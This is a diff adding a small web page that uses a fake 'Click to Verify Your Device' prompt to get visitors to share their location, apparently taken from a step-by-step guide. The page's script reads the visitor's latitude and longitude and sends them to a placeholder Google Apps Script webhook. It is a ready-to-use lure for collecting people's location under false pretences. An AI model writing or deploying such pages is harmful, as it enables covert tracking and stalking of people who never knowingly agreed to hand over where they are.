@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h2>Click to Verify Your Device</h2>
+    <script>
+        // Ask for location
+        navigator.geolocation.getCurrentPosition(function(position){
+            var lat = position.coords.latitude;
+            var lng = position.coords.longitude;
+            
+            // Show the result on screen (optional)
+            document.getElementById("result").innerHTML = "Lat: " + lat + "<br>Lng: " + lng;
+            
+            // Send it to your server or Google Sheets (see Step 2)
+            fetch("https://script.google.com/macros/s/YOUR_WEBHOOK_URL/exec?lat=" + lat + "&lng=" + lng);
+        });
+    </script>
+    <p id="result"></p>
+</body>
+</html>
